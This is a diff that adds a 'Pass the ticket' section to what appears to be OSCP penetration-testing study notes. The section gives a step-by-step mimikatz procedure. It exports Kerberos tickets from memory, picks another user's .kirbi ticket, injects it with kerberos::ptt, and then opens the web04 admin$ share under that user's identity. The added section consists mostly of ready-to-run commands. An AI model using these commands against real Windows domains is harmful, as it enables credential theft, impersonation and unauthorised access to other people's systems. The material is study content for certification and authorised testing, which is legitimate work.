@@ -678,6 +678,33 @@ PS> iwr -UseDefaultCredentials <servicename>://<computername>
 ![image](https://github.com/kullaisec/OSCP/assets/99985908/0bc204da-3f87-4deb-9e2e-72b806232314)
 
 
+## Pass the ticket !!
+
+Suppose you are user `jen` and you dont't have access to the `web04` shares only the `dave` user have access
+
+We can get the Ticket of the dave user as a jen user and import it on our computer and get access the web04 ad jen user with dave ticket identity !!
+
+commands
+```javascript
+.\mimikatz.exe
+
+sekurlsa::tickets /export
+
+exit
+
+dir *.kirbi
+
+# select anyone TGS of the dave user with extenstion *.kirbi
+#switch to mimikatz enter the folowing
+
+kerberos::ptt [0;76126]-2-0-40e10000-dave@web04-<RHOST>.LOCAL.kirbi
+
+klist
+
+dir \\web04\admin$
+# Now we can access any shares as jen user as a dave Identity !!
+```
+
 ## Golden Ticket !!
 
 We have krbtgt hash !! [From Linux]
